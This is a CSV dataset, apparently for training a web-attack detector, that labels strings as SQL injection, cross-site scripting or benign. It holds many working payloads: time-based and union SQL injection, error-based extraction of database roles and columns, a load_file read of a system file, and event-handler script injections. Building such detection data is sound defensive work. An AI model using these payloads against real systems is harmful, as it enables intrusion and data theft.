payload,type
"-8491"" where 6107  =  6107 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",sqli
 union select,sqli
malott,benign
lorraine,benign
"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",sqli
"<td onmousedown=""alert(1)"">test</td>",xss
1) or sleep(__TIME__)#,sqli
""";a=prompt,a()//",xss
"<hgroup onmouseenter=""alert(1)"">test</hgroup>",xss
"""  )   or   (  ""x""  )    =    (  ""x",sqli
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""%""  =  """,sqli
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- ",sqli
<svg><wbr onload=alert(1)></wbr>,xss
"<body onmouseup=""alert(1)"">test</body>",xss
88003603z,benign
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationend=""alert(1)""></thead>",xss
3675,benign
-8504 where 3086  =  3086 or 1131  =  9188#,sqli
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",sqli
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",sqli
"1   )    )    as jfae where 6684  =  6684 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"<style>@keyframes x{}</style><li style=""animation-name:x"" onanimationstart=""alert(1)""></li>",xss
<script src=//3334957647/1>,xss
5.58E+15,benign
peine3@psychominders.gob,benign
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'dthp'  =  'dthp",sqli
nicole-meyer@creacionesdolcevita.us,benign
"<style>:target {color: red;}</style><summary id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></summary>",xss
"<div draggable=""true"" contenteditable>drag me</div><nobr ondragover=alert(1) contenteditable>drop here</nobr>",xss
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",sqli
villalgordo del marquesado,benign
<body>Hello</body>,xss
"<cite onmouseleave=""alert(1)"">test</cite>",xss
 or 1=1--,sqli
lores bigas,benign
"<var onpaste=""alert(1)"" contenteditable>test</var>",xss
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",sqli
"<progress onkeypress=""alert(1)"" contenteditable>test</progress>",xss
srdida.me3te,benign
correnta,benign
pusit@marketingmunicipal.ro,benign
19119,benign
"<shadow onmousedown=""alert(1)"">test</shadow>",xss
<svg><optgroup onload=alert(1)></optgroup>,xss
" UNION SELECT @@VERSION,SLEEP(5),USER(),4#",sqli
"<div id=""29""><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[""'`-->]]>]</div><div id=""30""><style>@import ""data:,*%7bx:expression(alert(30))%7D"";</style>//[""'`-->]]>]</div><div id=""31""><frameset onload=alert(31)>//[""'`-->]]>]</div><div id=""32""><table background=""javascript:alert(32)""></table>//[""'`-->]]>]</div><div id=""33""><a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""alert(33);"">XXX</a></a><a href=""javascript:alert(2)"">XXX</a>//[""'`-->]]>]</div><div id=""34"">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[""'`-->]]>]</div><div id=""35"">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[""'`-->]]>]</div><div id=""36""><a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(36)"">XXX</a>//[""'`-->]]>]</div><div id=""37""><!--<img src=""--><img src=x onerror=alert(37)//"">//[""'`-->]]>]</div><div id=""38""><comment><img src=""</comment><img src=x onerror=alert(38)//"">//[""'`-->]]>]</div>",xss
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk,sqli
" select * from users where id  =  1 or @#""{  =  1 or 1  =  1 -- 1",sqli
"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",sqli
villanueva del rosario,benign
inciertamente,benign
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onanimationend=""alert(1)""></xmp>",xss
"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",xss
36574,benign
"<style>:target {color:red;}</style><shadow id=x style=""transition:color 1s"" ontransitionend=alert(1)></shadow>",xss
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",xss
<head id=x tabindex=1 onbeforedeactivate=alert(1)></head><input autofocus>,xss
venfica,benign
"<time onbeforecut=""alert(1)"" contenteditable>test</time>",xss
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',sqli
1  )   where 4573  =  4573,sqli
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",sqli
august,benign
"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>",xss
"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",xss
"<script onmouseleave=""alert(1)"">test</script>",xss
9570,benign
"<style>@keyframes x{}</style><u style=""animation-name:x"" onanimationstart=""alert(1)""></u>",xss
"<dd onkeypress=""alert(1)"" contenteditable>test</dd>",xss
"pasaje cox 194, 5?f",benign
<svg><samp onload=alert(1)></samp>,xss
"1  )   where 5232  =  5232 union all select null,null,null#",sqli
nehemiah,benign
"<style>:target {transform: rotate(180deg);}</style><big id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></big>",xss
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",xss
lani,benign
obolensky@etnics.hr,benign
"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",sqli
"1) or benchmark(10000000,MD5(1))#",sqli
<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>,xss
aristin,benign
"<samp onmouseover=""alert(1)"">test</samp>",xss
"-3361   )    )    union all select 2827,2827,2827,2827#",sqli
<html id=x tabindex=1 onfocusin=alert(1)></html>,xss
-1700%' or 4149  =  3391#,sqli
7.93E+15,benign
"<article draggable=""true"" ondragend=""alert(1)"">test</article>",xss
"<style>:target {transform: rotate(180deg);}</style><noembed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noembed>",xss
"<body oncut=""alert(1)"" contenteditable>test</body>",xss
"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sqli
"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli
"<video oncopy=""alert(1)"" contenteditable>test</video>",xss
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E,xss
kimbroug,benign
"<style>@keyframes x{}</style><h1 style=""animation-name:x"" onanimationend=""alert(1)""></h1>",xss
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationend=""alert(1)""></main>",xss
 ORDER BY 17# ,sqli
declare @q nvarchar   (  4000  )   select @q   = ,sqli
"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",sqli
"<div draggable=""true"" contenteditable>drag me</div><blink ondragover=alert(1) contenteditable>drop here</blink>",xss
"<style>:target {color: red;}</style><select id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></select>",xss
1  )   as drgs where 1989  =  1989 order by 1--,sqli
372,benign
1'  )   as rbpx where 1264  =  1264,sqli
visionario,benign
burg,benign
"<figure onmouseenter=""alert(1)"">test</figure>",xss
"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sqli
bada gorina,benign
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></body>",xss
datario,benign
" end and    (    (   ""rqay"" like ""rqay",sqli
%20or%201=1,sqli
nab,benign
leshowit,benign
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'fnjm'  =  'fnjm",sqli
"<dl draggable=""true"" ondragend=""alert(1)"">test</dl>",xss
"1"" where 7380  =  7380 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></h1>",xss
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,sqli
pravia,benign
<svg><acronym onload=alert(1)></acronym>,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blink>",xss
englert,benign
"c/ fuente pista de tenis, 164",benign
select sleep  (  5  )  -- waln,sqli
"<del onmouseleave=""alert(1)"">test</del>",xss
"1"" where 6501  =  6501",sqli
"<sub ondblclick=""alert(1)"">test</sub>",xss
<address id=x tabindex=1 onactivate=alert(1)></address>,xss
"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,sqli
a24a70re8a,benign
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",sqli
1   )    )     )   and 6467  =  1864#,sqli
"<thead onmouseup=""alert(1)"">test</thead>",xss
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",xss
"1  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
"1%""  )   union all select null,null,null,null--",sqli
"<canvas draggable=""true"" ondrag=""alert(1)"">test</canvas>",xss
antirreglamentaria,benign
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",sqli
1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,sqli
-7648'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,sqli
"<center onbeforecut=""alert(1)"" contenteditable>test</center>",xss
1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',sqli
"<col onbeforecut=""alert(1)"" contenteditable>test</col>",xss
"<br onmouseleave=""alert(1)"">test</br>",xss
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",sqli
"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>",xss
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></canvas>",xss
madgett,benign
"<em onmouseout=""alert(1)"">test</em>",xss
"<style>@keyframes slidein {}</style><input style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></input>",xss
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",xss
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",sqli
ab_ogadora,benign
<shadow onblur=alert(1) tabindex=1 id=x></shadow><input autofocus>,xss
torre-pacheco,benign
wildt_feng-chiao@paseotuperro.ke,benign
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",xss
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",sqli
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationstart=""alert(1)""></strike>",xss
6.64E+14,benign
"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",sqli
moll aybar,benign
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,xss
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,xss
"-2378"" where 2686  =  2686 or 6872  =  6872--",sqli
"),NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli
"<style>:target {transform: rotate(180deg);}</style><dt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dt>",xss
"calle poeta guillen colom, 34, 4?d",benign
cortegana,benign
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sqli
<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,xss
regla casiano,benign
43061609c,benign
"<isindex draggable=""true"" ondrag=""alert(1)"">test</isindex>",xss
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",sqli
"<ins onkeypress=""alert(1)"" contenteditable>test</ins>",xss
0,sqli
34192,benign
42808198t,benign
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""%""  =  """,sqli
vizcaya,benign
1'  )   as qcse where 4147  =  4147 waitfor delay '0:0:5'--,sqli
"<h1 onkeydown=""alert(1)"" contenteditable>test</h1>",xss
<svg><sup onload=alert(1)></sup>,xss
bahabn de esgueva,benign
"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",sqli
claudine,benign
"<style>@keyframes x{}</style><map style=""animation-name:x"" onanimationend=""alert(1)""></map>",xss
"1'+  (  select 'bmit' where 3716  =  3716 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'",sqli
"-6406%'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  '",sqli
"<plaintext oncontextmenu=""alert(1)"">test</plaintext>",xss
"<table onmouseout=""alert(1)"">test</table>",xss
"-6940'  )   union all select 3042,3042,3042,3042,3042#",sqli
" select * from users where id  =  1 or $+<\ union select 1,@@VERSION -- 1",sqli
"<style>@keyframes x{}</style><template style=""animation-name:x"" onanimationstart=""alert(1)""></template>",xss
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",sqli
raysa,benign
<spacer id=x tabindex=1 onactivate=alert(1)></spacer>,xss
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sqli
33560,benign
 (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,sqli
salustio,benign
undus de lerda,benign
"-5243"" where 2105  =  2105 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",sqli
"  (  select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ",sqli
"<audio oncopy=""alert(1)"" contenteditable>test</audio>",xss
"1""  )   union all select null,null,null,null#",sqli
landau silvestre,benign
"<base draggable=""true"" ondrag=""alert(1)"">test</base>",xss
"-9508  )   union all select 9950,9950,9950,9950,9950,9950,9950#",sqli
<small id=x tabindex=1 onbeforedeactivate=alert(1)></small><input autofocus>,xss
"<cite onmouseup=""alert(1)"">test</cite>",xss
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",sqli
"<rt onmouseout=""alert(1)"">test</rt>",xss
"<% foo><x foo=""%><script>alert(91)</script>"">//[""'`-->]]>]</div>",xss
"<style>:target {color: red;}</style><marquee id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></marquee>",xss
"<div draggable=""true"" contenteditable>drag me</div><dfn ondrop=alert(1) contenteditable>drop here</dfn>",xss
"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",sqli
waitfor delay '0:0:5' and    (    (   7619  =  7619,sqli
"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",xss
"<style>@keyframes x{}</style><col style=""animation-name:x"" onanimationend=""alert(1)""></col>",xss
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",sqli
"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
"<tbody onbeforepaste=""alert(1)"" contenteditable>test</tbody>",xss
"1   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   7992  =  7992",sqli
a' or 'a' = 'a,sqli
or ''  =  ',sqli
" select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",sqli
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,xss
"1%' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and '%'  =  '",sqli
p21urit56,benign
"<base onmousedown=""alert(1)"">test</base>",xss
"<style>@keyframes x{}</style><canvas style=""animation-name:x"" onanimationstart=""alert(1)""></canvas>",xss
"<style>@keyframes x{}</style><meta style=""animation-name:x"" onanimationstart=""alert(1)""></meta>",xss
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>",xss
"1  )   union all select null,null,null,null,null,null,null#",sqli
^',sqli
"<rb oncut=""alert(1)"" contenteditable>test</rb>",xss
4or6un0,benign
"<strong onmousemove=""alert(1)"">test</strong>",xss
"admin"" or 1  =  1",sqli
';waitfor delay '0:0:__TIME__'--,sqli
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'wvzw'  =  'wvzw",sqli
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,sqli
 AND 1=0 AND '%'=',sqli
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sqli
"c/ belgica, 69 2?d",benign
plza. almudaina s/n,benign
narros de matalayegua,benign
-7786'   )    )    or 9323  =  9323#,sqli
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",xss
"<style>:target {transform: rotate(180deg);}</style><rt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rt>",xss
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",sqli
"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",sqli
"<style onclick=""alert(1)"">test</style>",xss
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",sqli
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",xss
"caada de los ingleses, 117,",benign
"calle da unidade, 184 7e",benign
roccardi.betten@carrillo-de-albornoz.mil,benign
"<q onclick=""alert(1)"">test</q>",xss
"<s onmouseover=""alert(1)"">test</s>",xss
"pasaje magistrado salvador barbera 136,",benign
"<u draggable=""true"" ondragend=""alert(1)"">test</u>",xss
6.49E+15,benign
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",sqli
"<embed onpaste=""alert(1)"" contenteditable>test</embed>",xss
cervera del ro alhama,benign
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit",sqli
"<em onbeforecopy=""alert(1)"" contenteditable>test</em>",xss
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ",sqli
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",xss
vartan,benign
vilagut victori,benign
<svg><command onload=alert(1)></command>,xss
humaina,benign
"<big onmouseup=""alert(1)"">test</big>",xss
"<sub onbeforecut=""alert(1)"" contenteditable>test</sub>",xss
"<dialog oncut=""alert(1)"" contenteditable>test</dialog>",xss
"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",sqli
‘ or 1  =  1 --,sqli
"1   )    )    union all select null,null,null,null,null,null,null,null,null--",sqli
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",sqli
pradeep,benign
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",xss
"<xmp onpaste=""alert(1)"" contenteditable>test</xmp>",xss
69663934q,benign
leonel,benign
"<style>:target {transform: rotate(180deg);}</style><details id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></details>",xss
"<cite oncut=""alert(1)"" contenteditable>test</cite>",xss
<ins id=x tabindex=1 onfocusin=alert(1)></ins>,xss
"<strike oncut=""alert(1)"" contenteditable>test</strike>",xss
"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",sqli
"<base onbeforepaste=""alert(1)"" contenteditable>test</base>",xss
"1   )    )    union all select null,null,null,null#",sqli
lemieux4,benign
"-1755%' union all select 2615,2615,2615,2615,2615,2615#",sqli
"<col ondblclick=""alert(1)"">test</col>",xss
<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>,xss
"-6093'  )   where 9676  =  9676 union all select 9676,9676,9676,9676,9676,9676--",sqli
"or 0  =  0 #""",sqli
"<style>@keyframes slidein {}</style><mark style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></mark>",xss
heldabrand5@chevrolet-volt.bg,benign
pensosa,benign
" select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",sqli
"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",sqli
"<datalist onmouseleave=""alert(1)"">test</datalist>",xss
"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>",xss
48483117z,benign
"<header onkeydown=""alert(1)"" contenteditable>test</header>",xss
"-2612""  )   as iwfj where 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",sqli
frison@barnizultravioleta.jm,benign
"pl. ingeniero torres quevedo, s/n 7?a",benign
88360528w,benign
"<style ondblclick=""alert(1)"">test</style>",xss
kouraviev@socimi.com.gl,benign
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sqli
1'   )    )     )   and 7533  =  7533 and    (    (     (  'suzd' like 'suzd,sqli
"<strong onkeyup=""alert(1)"" contenteditable>test</strong>",xss
"<address onmouseout=""alert(1)"">test</address>",xss
"<div draggable=""true"" contenteditable>drag me</div><main ondrop=alert(1) contenteditable>drop here</main>",xss
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",sqli
57584234p,benign
<dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>,xss
"<slot ondblclick=""alert(1)"">test</slot>",xss
"</a>//[""'`-->]]>]</div>",xss
"<spacer onmouseenter=""alert(1)"">test</spacer>",xss
"<dfn onmouseout=""alert(1)"">test</dfn>",xss
<x%0Donxxx=1 ,xss
"<set attributeName=""xlink:href"" begin=""accessKey(a)"" to=""//example.com/?a"" />",xss
arseniato,benign
molledo basagaa,benign
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",sqli
-2120'  )   or 8734  =  8844#,sqli
"<style>:target {transform: rotate(180deg);}</style><a id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></a>",xss
bartlett@waterflyesp.eh,benign
"<select onbeforecut=""alert(1)"" contenteditable>test</select>",xss
<svg><shadow onload=alert(1)></shadow>,xss
<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>,xss
